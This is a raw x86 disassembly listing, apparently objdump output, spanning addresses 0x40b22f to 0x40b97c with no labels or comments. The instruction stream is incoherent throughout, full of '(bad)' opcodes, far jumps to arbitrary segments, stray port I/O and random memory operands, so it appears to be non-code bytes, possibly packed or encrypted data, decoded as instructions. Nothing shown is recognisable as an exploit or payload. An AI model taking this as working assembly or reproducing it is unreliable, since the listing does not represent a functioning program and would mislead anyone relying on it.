  40b22f:	and    esi,DWORD PTR [ebp+0x1041555]
  40b235:	and    BYTE PTR [edx],al
  40b237:	dec    ecx
  40b238:	push   ecx
  40b239:	and    ah,BYTE PTR [eax-0x12f8d7a8]
  40b23f:	jle    0x40b23f
  40b241:	mov    edi,0x440006
  40b246:	push   esi
  40b247:	add    BYTE PTR [ebx+0x0],al
  40b24a:	dec    esp
  40b24b:	add    BYTE PTR [ecx+0xb],al
  40b24e:	add    BYTE PTR [eax+0xe],dl
  40b251:	sbb    cl,BYTE PTR [ebx-0x1]
  40b254:	jg     0x40b255
  40b256:	aas    
  40b257:	inc    edi
  40b258:	add    BYTE PTR [ebp+0x0],al
  40b25b:	dec    ecx
  40b25c:	add    BYTE PTR [esi+0x0],cl
  40b25f:	inc    esi
  40b260:	add    BYTE PTR [edi-0x60],cl
  40b263:	push   0xfffffff5
  40b265:	add    BYTE PTR [ecx+0x7d],dl
  40b268:	add    bh,bh
  40b26a:	test   BYTE PTR [eax],0x43
  40b26d:	pop    es
  40b26e:	add    bh,bh
  40b270:	(bad)  
  40b271:	(bad)  
  40b272:	dec    eax
  40b274:	and    eax,0xa3e300
  40b279:	push   edi
  40b27a:	stc    
  40b27b:	add    BYTE PTR [eax+eax*8+0x6e2f00],dh
  40b282:	lods   eax,DWORD PTR ds:[esi]
  40b283:	add    BYTE PTR [bp+di+0x66],ch
  40b287:	add    BYTE PTR [edx],ah
  40b289:	test   al,0x0
  40b28b:	sub    ebp,ebp
  40b28d:	add    BYTE PTR [ebp-0x16dcff91],ah
  40b293:	(bad)  
  40b294:	(bad)  
  40b295:	(bad)  
  40b296:	inc    DWORD PTR [eax]
  40b298:	loope  0x40b292
  40b29a:	add    BYTE PTR [esi+0x1a61001b],dl
  40b2a0:	add    BYTE PTR [esi+0x27660016],bl
  40b2a6:	add    al,ch
  40b2a8:	adc    DWORD PTR [eax],eax
  40b2aa:	push   ebx
  40b2ab:	push   ecx
  40b2ac:	add    BYTE PTR [esi-0x53],bl
  40b2af:	add    BYTE PTR [esi+0x2f],ch
  40b2b2:	add    BYTE PTR [edi-0x78],bl
  40b2b5:	add    BYTE PTR [eax],cl
  40b2b7:	out    0x6f,al
  40b2b9:	(bad)  
  40b2ba:	inc    DWORD PTR [edx+0xb5f400]
  40b2c0:	jbe    0x40b24b
  40b2c2:	add    BYTE PTR [esi+eax*4],dh
  40b2c5:	add    BYTE PTR [ebx+eax*1],cl
  40b2c8:	add    BYTE PTR [eax-0x40ffb483],cl
  40b2ce:	add    al,BYTE PTR [eax]
  40b2d0:	jle    0x40b2d1
  40b2d2:	mov    edi,0xb107f6b5
  40b2d7:	add    BYTE PTR [ecx],ch
  40b2d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2da:	jle    0x40b294
  40b2dc:	pop    ebp
  40b2dd:	and    cl,BYTE PTR [ecx*8+0xe0fa00]
  40b2e4:	xchg   ebx,eax
  40b2e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2e6:	add    al,bh
  40b2e8:	add    BYTE PTR [eax],0x14
  40b2eb:	aad    0xdb
  40b2ed:	outs   dx,BYTE PTR ds:[esi]
  40b2ee:	outs   dx,DWORD PTR ds:[esi]
  40b2ef:	outs   dx,DWORD PTR ds:[esi]
  40b2f0:	mov    al,ds:0xdaa20023
  40b2f5:	call   0x5fac:0xddcb0021
  40b2fc:	add    BYTE PTR [esi+ebp*8+0x45],dl
  40b300:	shl    BYTE PTR [esi+0x5bfedfdb],cl
  40b306:	in     al,dx
  40b307:	call   0xd1d1b3ed
  40b30c:	add    al,dl
  40b30e:	mov    al,0x0
  40b310:	sub    al,0xfa
  40b312:	scas   al,BYTE PTR es:[edi]
  40b313:	nop
  40b314:	add    bh,cl
  40b316:	push   cs
  40b317:	add    BYTE PTR [ebp-0x60],cl
  40b31a:	sub    DWORD PTR [edx],0xffffffff
  40b31d:	outs   dx,DWORD PTR ds:[esi]
  40b31e:	(bad)  
  40b31f:	inc    DWORD PTR [eax]
  40b321:	dec    edx
  40b322:	lds    eax,FWORD PTR [eax]
  40b324:	cmp    ecx,DWORD PTR [ebp+0xa0d000]
  40b32a:	cmp    al,0xfd
  40b32c:	add    BYTE PTR [esi+0x3e00fc41],bh
  40b332:	mov    dh,0x0
  40b334:	xor    BYTE PTR [ebx+0x7b3500],ch
  40b33a:	loop   0x40b347
  40b33c:	add    al,0x6d
  40b33e:	mov    bl,0xa
  40b340:	fdivr  QWORD PTR [ecx+ecx*4+0x6f]
  40b344:	out    dx,al
  40b345:	(bad)  
  40b346:	fidiv  WORD PTR [esi]
  40b348:	pop    eax
  40b349:	sub    ah,bh
  40b34b:	(bad)  
  40b34c:	fcmovnu st,st(3)
  40b34e:	add    BYTE PTR [ecx],ah
  40b350:	jl     0x40b37c
  40b352:	push   edx
  40b353:	add    BYTE PTR [edx],bh
  40b355:	cmp    bl,dl
  40b357:	fwait
  40b358:	add    BYTE PTR [edi+edx*4+0x0],bl
  40b35c:	sbb    dl,ch
  40b35e:	add    ch,cl
  40b360:	fld    DWORD PTR [eax]
  40b362:	daa    
  40b363:	leave  
  40b364:	add    ch,dl
  40b366:	fdivr  st(0),st
  40b368:	(bad)  
  40b369:	push   ss
  40b36a:	shl    dh,cl
  40b36c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b36d:	pop    esi
  40b36e:	clc    
  40b36f:	loop   0x40b375
  40b371:	add    BYTE PTR [edi+0xac54d1],dh
  40b377:	add    al,0x6b
  40b379:	mov    bh,0xff
  40b37b:	fild   QWORD PTR [ecx]
  40b37d:	mov    bl,0x0
  40b37f:	je     0x40b3b6
  40b381:	add    BYTE PTR [edx],cl
  40b383:	add    DWORD PTR [eax],0x63001784
  40b389:	iret   
  40b38a:	mov    fs,WORD PTR [eax+eax*1+0x227c1682]
  40b391:	push   ss
  40b392:	mov    esp,0x20bd7fe1
  40b397:	add    BYTE PTR [eax-0x1],bh
  40b39a:	add    BYTE PTR ds:0x20c00037,al
  40b3a0:	xor    al,0xd6
  40b3a2:	add    BYTE PTR [ecx-0x6a],dh
  40b3a5:	xor    edi,DWORD PTR [ebx+0x816dec0]
  40b3ab:	fsubp  st(2),st
  40b3ad:	cwde   
  40b3ae:	rol    BYTE PTR [edx+0x2102005d],1
  40b3b4:	adc    BYTE PTR [edi],ch
  40b3b6:	mov    al,0xb6
  40b3b8:	mov    ebp,0xdbc184
  40b3bd:	pushf  
  40b3be:	push   ss
  40b3bf:	scas   eax,DWORD PTR es:[edi]
  40b3c0:	push   ebp
  40b3c1:	mov    esi,0xa5c6ee58
  40b3c6:	add    BYTE PTR gs:[esi],ah
  40b3c9:	xor    ebp,DWORD PTR [esi+eax*4-0x7e]
  40b3cd:	ins    BYTE PTR es:[edi],dx
  40b3ce:	jle    0x40b3e3
  40b3d0:	or     dl,ah
  40b3d2:	lods   al,BYTE PTR ds:[esi]
  40b3d3:	ins    DWORD PTR es:[edi],dx
  40b3d4:	sahf   
  40b3d5:	push   0xffffff8b
  40b3d7:	dec    eax
  40b3d8:	mov    ah,0x66
  40b3da:	retf   0xf3d0
  40b3dd:	adc    BYTE PTR [edx+0x431b00ea],cl
  40b3e3:	mov    bl,0xf6
  40b3e5:	cmp    BYTE PTR [eax+0x24],0xfb
  40b3e9:	add    BYTE PTR [esi],ch
  40b3eb:	inc    esp
  40b3ec:	out    dx,al
  40b3ed:	push   ebx
  40b3ee:	jo     0x40b3b4
  40b3f0:	inc    edx
  40b3f1:	je     0x40b3b4
  40b3f3:	xchg   BYTE PTR [edi],dh
  40b3f5:	jg     0x40b3f4
  40b3f7:	inc    DWORD PTR [eax]
  40b3f9:	in     eax,dx
  40b3fa:	push   es
  40b3fb:	add    al,cl
  40b3fd:	out    0x32,al
  40b3ff:	add    BYTE PTR [esi-0x3ff0b050],dh
  40b405:	and    BYTE PTR [esi+0x6b0602f8],0x69
  40b40c:	add    BYTE PTR [edx-0x6c],bh
  40b40f:	mov    BYTE PTR [eax],dl
  40b411:	pusha  
  40b412:	fcomp  st(6)
  40b414:	cld    
  40b415:	outs   dx,DWORD PTR ds:[esi]
  40b416:	clc    
  40b417:	and    BYTE PTR [eax+eax*1-0x7a2b6223],bh
  40b41e:	add    cl,bl
  40b420:	fild   DWORD PTR [eax]
  40b422:	les    esp,FWORD PTR [edx]
  40b424:	add    ah,ah
  40b426:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b427:	push   ds
  40b428:	add    BYTE PTR [edx-0x52fa0ff4],dl
  40b42e:	fld    QWORD PTR [esi+0x2b]
  40b431:	add    ah,ch
  40b433:	jo     0x40b48c
  40b435:	out    dx,al
  40b436:	push   esp
  40b437:	shl    BYTE PTR [edx+0x33],cl
  40b43a:	add    BYTE PTR [edx-0x74],ah
  40b43d:	or     ch,ah
  40b43f:	(bad)  
  40b441:	mov    esp,0xb9f9009e
  40b446:	jo     0x40b3ff
  40b448:	add    ch,al
  40b44a:	mov    DWORD PTR [eax],0xc0003ed3
  40b450:	jmp    0xf21b:0x8afb717a
  40b457:	jle    0x40b459
  40b459:	xchg   esi,ebp
  40b45b:	or     BYTE PTR [ecx+0x0],dh
  40b45e:	mov    bl,0x31
  40b460:	mov    esi,0x1a8e00cc
  40b465:	push   ds
  40b466:	scas   al,BYTE PTR es:[edi]
  40b467:	pop    eax
  40b468:	repnz mov ch,al
  40b46b:	jl     0x40b44f
  40b46d:	add    BYTE PTR ds:0xa34ac6fe,dl
  40b473:	ficom  WORD PTR [ecx+0x61]
  40b476:	outs   dx,DWORD PTR ds:[esi]
  40b477:	pop    edx
  40b478:	add    BYTE PTR [ebx*8+0x305adc1c],bl
  40b47f:	mov    ds:0x78240063,eax
  40b484:	sti    
  40b485:	fld    TBYTE PTR [ebx]
  40b487:	les    ebx,FWORD PTR [edi+0x469b001d]
  40b48d:	stos   BYTE PTR es:[edi],al
  40b48e:	imul   eax,DWORD PTR [eax],0xffffffbc
  40b491:	aam    0x0
  40b493:	aam    0x34
  40b495:	xor    ecx,esi
  40b497:	add    BYTE PTR [edx-0x5790938c],dh
  40b49d:	mov    cs,WORD PTR ds:0x7604b0
  40b4a3:	cmp    BYTE PTR [eax],dl
  40b4a5:	xor    BYTE PTR [edx+0x7e],al
  40b4a8:	dec    ebp
  40b4a9:	outs   dx,DWORD PTR ds:[esi]
  40b4aa:	push   0x7fda3705
  40b4af:	add    BYTE PTR [eax-0x5e],al
  40b4b2:	sti    
  40b4b3:	sbb    al,0xf3
  40b4b5:	mov    esi,es
  40b4b7:	xchg   DWORD PTR [eax],eax
  40b4b9:	fidiv  WORD PTR [eax+0x30f15c15]
  40b4bf:	add    BYTE PTR [eax+0xd4c3d],dh
  40b4c5:	into   
  40b4c6:	lock imul esi,DWORD PTR [eax+0x6b],0x51dc3892
  40b4ce:	push   ecx
  40b4cf:	sub    dl,BYTE PTR ds:0xa184ae40
  40b4d5:	add    bl,bl
  40b4d7:	(bad)  
  40b4d8:	(bad)  
  40b4d9:	mov    al,0x99
  40b4db:	scas   eax,DWORD PTR es:[edi]
  40b4dc:	dec    esp
  40b4dd:	out    0xe5,eax
  40b4df:	add    bl,dl
  40b4e1:	and    ah,bl
  40b4e3:	hlt    
  40b4e4:	sbb    al,0x5c
  40b4e6:	adc    al,BYTE PTR [esi+0xb]
  40b4e9:	or     bl,BYTE PTR [edx-0x15ffd601]
  40b4ef:	aas    
  40b4f0:	add    BYTE PTR [ebp+0x57],dl
  40b4f3:	add    BYTE PTR [edx+0x70],bl
  40b4f6:	xor    BYTE PTR [esi+0x54],cl
  40b4f9:	push   cs
  40b4fa:	mov    es,WORD PTR [ebp-0x45]
  40b4fd:	pusha  
  40b4fe:	rol    DWORD PTR [eax],0xf7
  40b501:	jb     0x40b57b
  40b503:	xchg   esi,eax
  40b504:	inc    edx
  40b505:	add    DWORD PTR [eax],eax
  40b507:	jg     0x40b585
  40b509:	(bad)  
  40b50a:	fs mov bh,0xb6
  40b50d:	jns    0x40b552
  40b50f:	not    BYTE PTR [esi+0x3b]
  40b512:	mov    ecx,0xc7065300
  40b517:	adc    BYTE PTR [eax+0x4c],dh
  40b51a:	sbb    eax,0x179b8d00
  40b51f:	je     0x40b4b9
  40b521:	dec    ebp
  40b522:	dec    esi
  40b523:	test   eax,0xd2c7f0
  40b528:	xchg   esp,eax
  40b529:	mov    dh,ch
  40b52b:	inc    ebx
  40b52c:	shl    ecx,0x60
  40b52f:	mov    al,ds:0x2790fea4
  40b534:	sub    al,0x6f
  40b536:	mov    al,0xe6
  40b538:	ins    DWORD PTR es:[edi],dx
  40b539:	jae    0x40b59b
  40b53b:	fsubr  st(3),st
  40b53d:	add    BYTE PTR [edi],dl
  40b53f:	pop    esp
  40b540:	xor    eax,0x7d2a8046
  40b545:	add    BYTE PTR [ebp+0x360bccd8],dl
  40b54b:	(bad)  
  40b54c:	out    dx,al
  40b54d:	xor    BYTE PTR [ecx+0x0],dh
  40b550:	scas   eax,DWORD PTR es:[edi]
  40b551:	retf   0x3740
  40b554:	test   ebp,0xee41561b
  40b55a:	add    BYTE PTR [ebx],al
  40b55c:	in     al,dx
  40b55d:	jae    0x40b5db
  40b55f:	add    BYTE PTR [esi],bh
  40b561:	pop    esi
  40b562:	mov    al,BYTE PTR [edx]
  40b564:	repz cmp BYTE PTR [eax-0x3aff3264],0x85
  40b56c:	nop
  40b56d:	icebp  
  40b56e:	inc    eax
  40b56f:	sub    ebp,DWORD PTR [eax+eiz*2+0xa87f3]
  40b576:	int3   
  40b577:	enter  0xf036,0x5d
  40b57b:	call   0x536c89fc
  40b580:	repz xchg ch,cl
  40b583:	add    BYTE PTR [edi+0x13],ch
  40b586:	cwde   
  40b587:	sub    al,0x1b
  40b589:	add    BYTE PTR [ebx],ah
  40b58b:	out    dx,eax
  40b58c:	enter  0xb604,0x55
  40b590:	mov    esp,0x90c9a143
  40b595:	pop    ds
  40b596:	add    BYTE PTR [ebp+0x6a],ah
  40b599:	call   0x64d1d226
  40b59e:	and    ch,ch
  40b5a0:	push   0x108cdfa2
  40b5a5:	icebp  
  40b5a6:	sub    dh,BYTE PTR [edx-0x64]
  40b5a9:	jg     0x40b5f2
  40b5ab:	imul   ebx,DWORD PTR [ebx],0xffffff92
  40b5ae:	add    BYTE PTR [ebp+0x58],dh
  40b5b1:	clc    
  40b5b2:	sub    BYTE PTR [edx+ecx*4],cl
  40b5b5:	(bad)  
  40b5b6:	mov    ebp,0x495700
  40b5bb:	jp     0x40b55d
  40b5bd:	ret    0x9876
  40b5c0:	es mov ah,0x4
  40b5c3:	(bad)  
  40b5c6:	das    
  40b5c7:	inc    ebx
  40b5c8:	mov    cl,0xa2
  40b5ca:	mov    al,ds:0xf7d2b6b4
  40b5cf:	les    esi,FWORD PTR [ecx+0x5b]
  40b5d2:	fadd   QWORD PTR [ebp-0x53]
  40b5d5:	test   al,0xa2
  40b5d7:	jmp    0x7cb1:0x4a3dfabb
  40b5de:	pop    ds
  40b5df:	ds loopne 0x40b61d
  40b5e2:	adc    al,0x47
  40b5e4:	inc    ebp
  40b5e5:	mov    al,0x19
  40b5e7:	(bad)  
  40b5e8:	lock sar BYTE PTR [eax-0x67],1
  40b5ec:	cli    
  40b5ed:	inc    ecx
  40b5ee:	rcr    DWORD PTR [ebx],cl
  40b5f0:	inc    esp
  40b5f1:	jp     0x40b58b
  40b5f3:	ret    
  40b5f4:	bound  eax,QWORD PTR [eax]
  40b5f6:	sub    dl,ah
  40b5f8:	xor    edi,DWORD PTR [eax+0x5a]
  40b5fb:	inc    ecx
  40b5fc:	and    DWORD PTR [eax+0x10],0x34126610
  40b603:	pushf  
  40b604:	aas    
  40b605:	mov    esi,0x8a2a1aad
  40b60a:	cmp    al,BYTE PTR [edx-0x5e]
  40b60d:	dec    edx
  40b60e:	sub    al,0xee
  40b610:	enter  0x4d3e,0x50
  40b614:	rcr    BYTE PTR [edx],1
  40b616:	mov    bh,BYTE PTR [edx-0x42]
  40b619:	(bad)  
  40b61a:	out    dx,eax
  40b61b:	adc    BYTE PTR [eax-0x7c],ch
  40b61e:	(bad)  [edx+0x74db4779]
  40b624:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b625:	loop   0x40b649
  40b627:	or     esp,ecx
  40b629:	add    DWORD PTR [eax],eax
  40b62b:	pop    esi
  40b62c:	xor    al,0x95
  40b62e:	inc    ebp
  40b62f:	fwait
  40b630:	or     bl,BYTE PTR [edx+0x78d2b2a8]
  40b636:	ins    DWORD PTR es:[edi],dx
  40b637:	push   ss
  40b638:	iret   
  40b639:	xchg   esi,eax
  40b63a:	and    BYTE PTR [ecx],bl
  40b63c:	dec    ecx
  40b63d:	shl    ecx,1
  40b63f:	out    0x0,al
  40b641:	inc    eax
  40b642:	mov    ds:0x9fdf0005,al
  40b647:	xchg   esi,eax
  40b648:	stos   BYTE PTR es:[edi],al
  40b649:	push   ss
  40b64a:	lds    ebp,FWORD PTR [ebp+0x6b]
  40b64d:	mov    ah,0x4
  40b64f:	jae    0x40b675
  40b651:	(bad)  
  40b652:	fidiv  DWORD PTR [edx+0x2d46bd90]
  40b658:	add    dh,ch
  40b65a:	or     dh,BYTE PTR [ebp+0x495b468a]
  40b660:	out    dx,al
  40b661:	out    0xb2,eax
  40b663:	jmp    FWORD PTR [ebp+0x4]
  40b666:	add    ah,BYTE PTR [edx]
  40b668:	sti    
  40b669:	ficom  WORD PTR [esi]
  40b66b:	adc    al,0x14
  40b66d:	ret    0x5a7c
  40b670:	(bad)  
  40b671:	ins    BYTE PTR es:[edi],dx
  40b672:	xchg   ebx,eax
  40b673:	inc    eax
  40b674:	sbb    al,0xc3
  40b676:	add    BYTE PTR [edi],dl
  40b678:	jl     0x40b6ce
  40b67a:	push   ebp
  40b67b:	shl    BYTE PTR [ecx+0x54],1
  40b67e:	mov    DWORD PTR [edx+ecx*1-0x52bb4a22],ebx
  40b685:	jns    0x40b662
  40b687:	adc    BYTE PTR [edi],bl
  40b689:	into   
  40b68a:	jo     0x40b6dd
  40b68c:	add    BYTE PTR [ebp-0x28cbba16],ah
  40b692:	(bad)  
  40b693:	push   esp
  40b694:	shl    BYTE PTR [eax+0x2b],1
  40b697:	xor    al,0x23
  40b699:	mov    eax,ds:0x961ee652
  40b69e:	xor    DWORD PTR [esi-0x18d1ab5],ebx
  40b6a4:	in     eax,dx
  40b6a5:	jl     0x40b6ce
  40b6a7:	mov    ebp,0xa973cb7d
  40b6ac:	pop    esp
  40b6ad:	out    dx,eax
  40b6ae:	mov    bl,0x2
  40b6b0:	cmc    
  40b6b1:	jb     0x40b72c
  40b6b3:	cs xchg ebp,eax
  40b6b5:	cld    
  40b6b6:	imul   esi,edx,0xffffffa1
  40b6b9:	or     edx,DWORD PTR [esi+ebp*1-0x31]
  40b6bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6be:	call   DWORD PTR [ebx+0x31]
  40b6c1:	lods   eax,DWORD PTR ds:[esi]
  40b6c2:	dec    ebx
  40b6c3:	xchg   edi,eax
  40b6c4:	retf   0xb9e5
  40b6c7:	test   BYTE PTR [ecx+0x1c7ed736],0x52
  40b6ce:	mov    ecx,0x5ba8113c
  40b6d3:	loope  0x40b66c
  40b6d5:	out    0x52,eax
  40b6d7:	mov    ecx,0x71862f70
  40b6dc:	(bad)  
  40b6dd:	in     eax,0xf2
  40b6df:	pop    esp
  40b6e0:	sub    bh,BYTE PTR [ebx-0x56ab3efc]
  40b6e6:	pop    esp
  40b6e7:	sahf   
  40b6e8:	dec    ebx
  40b6e9:	aaa    
  40b6ea:	mov    dl,0x71
  40b6ec:	loope  0x40b699
  40b6ee:	cs xchg ebp,eax
  40b6f0:	retf   
  40b6f1:	jae    0x40b713
  40b6f3:	loope  0x40b6b4
  40b6f5:	pop    edi
  40b6f6:	mov    bh,0xcf
  40b6f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6f9:	jb     0x40b774
  40b6fb:	leave  
  40b6fc:	sub    dl,BYTE PTR [ebx-0x461aa6a2]
  40b702:	push   esp
  40b703:	cs mov bh,0x5f
  40b706:	cmc    
  40b707:	cdq    
  40b708:	pop    edi
  40b709:	call   0x8a6c:0xd339ca97
  40b710:	or     DWORD PTR [esi+0x7cdfc300],esi
  40b716:	jae    0x40b70b
  40b718:	rol    DWORD PTR [eax],0x47
  40b71b:	cmp    al,0xbf
  40b71d:	add    BYTE PTR [ecx],ch
  40b71f:	js     0x40b71a
  40b721:	add    BYTE PTR [ebp-0x4effaebb],al
  40b727:	xor    eax,DWORD PTR [eax]
  40b729:	pusha  
  40b72a:	sbb    ebp,DWORD PTR [ebx+esi*8+0x33]
  40b72e:	retf   0x8c00
  40b731:	xchg   esp,eax
  40b732:	div    BYTE PTR [eax+0x38]
  40b735:	adc    edx,ebx
  40b737:	adc    dh,bl
  40b739:	rcl    al,1
  40b73b:	push   eax
  40b73c:	data16 das 
  40b73e:	es scas eax,DWORD PTR es:[edi]
  40b740:	out    0x1a,al
  40b742:	sub    al,0x2c
  40b744:	add    BYTE PTR fs:[esi+esi*2+0x5b],ah
  40b749:	pusha  
  40b74a:	cmp    esp,DWORD PTR [eax-0x5f]
  40b74d:	popa   
  40b74e:	(bad)  
  40b750:	popf   
  40b751:	pop    ds
  40b752:	cmp    ah,dh
  40b754:	add    BYTE PTR [eax-0x574019ba],ch
  40b75a:	stc    
  40b75b:	xchg   dl,dl
  40b75d:	add    dh,dl
  40b75f:	pop    ecx
  40b760:	out    dx,eax
  40b761:	(bad)  
  40b762:	jmp    0x40b764
  40b764:	or     ecx,DWORD PTR [ecx+0x748700]
  40b76a:	mov    al,BYTE PTR ss:[edx+0x402c082e]
  40b771:	dec    esi
  40b772:	mov    ebp,0x50da5522
  40b777:	mov    ah,0x3e
  40b779:	sbb    al,0xf9
  40b77b:	adc    BYTE PTR [edx-0x640193c],al
  40b781:	pop    ss
  40b782:	(bad)  
  40b783:	sar    BYTE PTR [esi],1
  40b785:	add    BYTE PTR [edx+0xb4b00b9],dh
  40b78b:	sbb    eax,0x757700
  40b790:	call   DWORD PTR [eax-0x197ae00]
  40b796:	sbb    ebx,edx
  40b798:	inc    ebp
  40b799:	lods   al,BYTE PTR ds:[esi]
  40b79a:	lods   al,BYTE PTR ds:[esi]
  40b79b:	cmp    esi,esp
  40b79d:	cdq    
  40b79e:	add    BYTE PTR [edx-0x1c],bl
  40b7a1:	add    ch,ah
  40b7a3:	out    0x0,eax
  40b7a5:	pavgb  mm7,QWORD PTR [esi]
  40b7a8:	int    0x15
  40b7aa:	test   al,0x3a
  40b7ac:	retf   
  40b7ad:	(bad)  
  40b7ae:	cmc    
  40b7af:	add    BYTE PTR [edi+0x3f],ah
  40b7b2:	mov    ds:0xb9a187ac,eax
  40b7b7:	jns    0x40b836
  40b7b9:	jge    0x40b7bb
  40b7bb:	cmc    
  40b7bc:	mov    esp,0xdce860e4
  40b7c1:	sub    al,0x7a
  40b7c3:	aaa    
  40b7c4:	cmp    al,BYTE PTR [eax]
  40b7c6:	cld    
  40b7c7:	(bad)  
  40b7c8:	hlt    
  40b7c9:	push   es
  40b7ca:	lea    eax,[eax]
  40b7cc:	xor    DWORD PTR [esi-0x1f54565d],0xffffffbf
  40b7d3:	xor    al,BYTE PTR [ebx+0x7c]
  40b7d6:	mov    cl,ah
  40b7d8:	lahf   
  40b7d9:	hlt    
  40b7da:	mov    cs:0x1445451d,al
  40b7e0:	adc    esi,edi
  40b7e2:	xchg   edx,eax
  40b7e3:	dec    esi
  40b7e4:	sub    eax,0x45b226af
  40b7e9:	inc    ebp
  40b7ea:	mov    dl,BYTE PTR [esi+0x40]
  40b7ed:	and    BYTE PTR [ecx],cl
  40b7ef:	fisub  DWORD PTR [esi-0x6b]
  40b7f2:	xor    al,0x6a
  40b7f4:	sub    esi,DWORD PTR [edx-0x53]
  40b7f7:	scas   al,BYTE PTR es:[edi]
  40b7f8:	and    BYTE PTR [edx-0x14],dh
  40b7fb:	pop    esp
  40b7fc:	arpl   sp,bx
  40b7fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7ff:	addr16 pop edx
  40b801:	add    eax,0xd04ea0ac
  40b806:	sub    ch,BYTE PTR ds:0x40f3fe46
  40b80c:	mov    esi,DWORD PTR [edi]
  40b80e:	mov    bl,0xa3
  40b810:	sbb    DWORD PTR [edx],esi
  40b812:	xor    al,0x34
  40b814:	pusha  
  40b815:	or     al,0x4e
  40b817:	mov    dl,0xbb
  40b819:	jnp    0x40b81b
  40b81b:	neg    bl
  40b81d:	rol    BYTE PTR [edx+0x587cc3c],0x6e
  40b824:	ret    0x1c83
  40b827:	jmp    0xff7c:0x560db068
  40b82e:	adc    dh,bh
  40b830:	jo     0x40b7c8
  40b832:	shr    BYTE PTR [eax+esi*1+0x6d],0x28
  40b837:	(bad)  
  40b838:	je     0x40b89c
  40b83a:	retf   0x2e28
  40b83d:	add    bl,cl
  40b83f:	sub    al,0xaa
  40b841:	push   0x1aaa32e8
  40b846:	xchg   esp,eax
  40b847:	out    0x60,al
  40b849:	xchg   esp,eax
  40b84a:	xchg   ecx,eax
  40b84b:	sub    BYTE PTR [edx+0x64e62b68],0x94
  40b852:	lahf   
  40b853:	sbb    BYTE PTR [ebp+edi*8+0x78],bl
  40b857:	push   edi
  40b858:	pop    ebx
  40b859:	gs stos BYTE PTR es:[edi],al
  40b85b:	dec    BYTE PTR [esi]
  40b85d:	inc    esi
  40b85e:	add    BYTE PTR [edi-0x1ed2bf56],dh
  40b864:	jmp    0xae958bb
  40b869:	dec    edx
  40b86a:	repz (bad) 
  40b86c:	sbb    cl,bh
  40b86e:	xchg   ecx,eax
  40b86f:	stc    
  40b870:	pop    ss
  40b871:	mov    ebp,0xfa003823
  40b876:	(bad)  
  40b877:	test   DWORD PTR [eax+eax*1],0x8100e584
  40b87e:	inc    ecx
  40b87f:	in     al,dx
  40b880:	jg     0x40b8d3
  40b882:	push   edi
  40b883:	inc    ecx
  40b884:	mov    ebp,0x88bc5fd2
  40b889:	(bad)  
  40b88a:	xchg   esp,eax
  40b88b:	repnz add dh,dh
  40b88e:	adc    eax,0x6ff30f00
  40b893:	(bad)  
  40b894:	fwait
  40b895:	iret   
  40b896:	ret    0x2b00
  40b899:	test   eax,0x54c300
  40b89e:	push   ss
  40b89f:	es pusha 
  40b8a1:	add    BYTE PTR [eax-0x73],ah
  40b8a4:	add    BYTE PTR [ebp-0x320199a3],bl
  40b8aa:	jg     0x40b8f8
  40b8ac:	add    BYTE PTR [ecx-0x1d88ffe5],bl
  40b8b2:	add    BYTE PTR [ebp+esi*4+0x3dd200de],ah
  40b8b9:	add    BYTE PTR [ebx],ch
  40b8bb:	jmp    0x40b899
  40b8bd:	jmp    DWORD PTR [edx-0x4be87d72]
  40b8c3:	jecxz  0x40b8bb
  40b8c5:	xor    bh,dh
  40b8c7:	sub    BYTE PTR [eax+eax*1+0x4c],cl
  40b8cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8cc:	add    BYTE PTR [ecx+0x5693a079],bh
  40b8d2:	xor    edi,DWORD PTR [eax+0x42fef285]
  40b8d8:	inc    ecx
  40b8d9:	inc    ebx
  40b8da:	xchg   ecx,eax
  40b8db:	pop    edx
  40b8dc:	xchg   dl,ch
  40b8de:	push   esi
  40b8df:	mov    esi,0xa2a247ae
  40b8e4:	mov    fs,WORD PTR [esi-0x2]
  40b8e7:	sub    BYTE PTR [ebx-0x2e],dh
  40b8ea:	mov    ds:0x82fe4e86,eax
  40b8ef:	stos   BYTE PTR es:[edi],al
  40b8f0:	xor    eax,0x58a846d8
  40b8f5:	sahf   
  40b8f6:	aad    0x70
  40b8f8:	push   esi
  40b8f9:	jmp    0x3756:0x12a1a8bf
  40b900:	out    0xdc,al
  40b902:	inc    ah
  40b904:	add    BYTE PTR es:[edx-0x295dff33],bl
  40b90b:	add    al,0xcd
  40b90d:	arpl   WORD PTR [ebx],sp
  40b90f:	or     bl,BYTE PTR [esi]
  40b911:	fadd   QWORD PTR [ebx+0x61fe6a46]
  40b917:	dec    BYTE PTR [ebx-0x29]
  40b91a:	popa   
  40b91b:	xchg   esp,eax
  40b91c:	inc    BYTE PTR [ebp-0x5d]
  40b91f:	add    ch,cl
  40b921:	iret   
  40b922:	add    BYTE PTR [edi],bl
  40b924:	ss xor eax,0x8e51545f
  40b92a:	out    0xa6,al
  40b92c:	xchg   BYTE PTR [esi+0x3f7f],dh
  40b932:	pop    ebx
  40b933:	cmp    DWORD PTR [edx],ecx
  40b935:	mov    edx,0xc464ac8a
  40b93a:	sbb    al,0xfe
  40b93c:	test   BYTE PTR [eax+esi*8-0x7b07f228],bh
  40b943:	out    0xb,al
  40b945:	ror    BYTE PTR [esi-0x54d6ff3d],0x52
  40b94c:	(bad)  
  40b94d:	and    al,0x6e
  40b94f:	xchg   dh,dl
  40b951:	sbb    al,BYTE PTR [eax+eiz*4]
  40b954:	sahf   
  40b955:	fwait
  40b956:	dec    esp
  40b957:	sbb    al,0x40
  40b959:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b95a:	sub    al,0xc3
  40b95c:	fisub  DWORD PTR [edx]
  40b95e:	xlat   BYTE PTR ds:[ebx]
  40b95f:	inc    ebx
  40b960:	loopne 0x40b924
  40b962:	(bad)  
  40b963:	mov    dh,0xdc
  40b965:	fadd   QWORD PTR ds:0xb0cd4546
  40b96b:	mov    ds:0x153caa9c,eax
  40b970:	xchg   edi,eax
  40b971:	es inc esi
  40b973:	xor    dh,bh
  40b975:	aas    
  40b976:	retf   0x6b2e
  40b979:	dec    BYTE PTR [edx+0x0]
  40b97c:	dec    esi
